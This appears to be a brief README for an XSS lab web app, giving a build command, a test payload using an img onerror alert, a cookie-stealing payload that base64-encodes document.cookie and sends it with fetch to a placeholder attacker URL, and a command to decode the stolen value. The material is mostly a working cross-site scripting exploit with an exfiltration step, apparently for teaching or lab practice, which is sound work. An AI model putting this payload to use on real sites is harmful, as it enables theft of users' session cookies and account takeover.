# to run web app
```
./build_run.sh
```

# payload to testing xss
```
<img src=hello onerror=alert("Hello world") />
```

# payload to exploit steal cookie victim
```
<img src=hello onerror=fetch(`${url_attacker}?cookie=${btoa(document.cookie)}`) />
```

# command to decode base64
```
echo ${cookie_encoded} | base64 -d
```